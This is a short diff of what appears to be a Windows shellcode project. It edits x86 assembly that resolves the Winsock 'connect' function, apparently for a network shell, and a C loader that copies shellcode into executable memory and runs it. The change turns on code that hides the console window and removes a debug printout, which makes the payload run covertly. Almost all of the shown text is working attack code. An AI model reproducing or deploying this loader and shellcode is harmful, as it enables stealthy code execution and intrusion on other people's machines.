@@ -159,7 +159,7 @@ ADD  BL, 0x4                         ;add 0x4 to lower register BL
 IMUL EBX, 0x63                       ;EBX = 0x18c
 MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
 PUSH 0x61746365                      ;"atce"
-SUB  word [ESP + 0x3], 0x61		     ;"tce" (remove "a")
+SUB  word [ESP + 0x3], 0x61	     ;"tce" (remove "a")
 PUSH 0x6e6e6f63                      ;"nnoc"
 PUSH ESP                             ;"connect", second argument of GetProcAddress
 PUSH EDI                             ;ws32_2.dll address, first argument of GetProcAddress
@@ -279,9 +279,8 @@ char code[] =
 
 int main(int argc, char** argv)
 {
-	//HWND hWnd = GetConsoleWindow();
-	//ShowWindow(hWnd, SW_HIDE);
-	printf("Shellcode Length:  %d\n", strlen(code));
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
 	void* exec = VirtualAlloc(0, strlen(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, code, sizeof(code));
 	((void(*)())exec)();
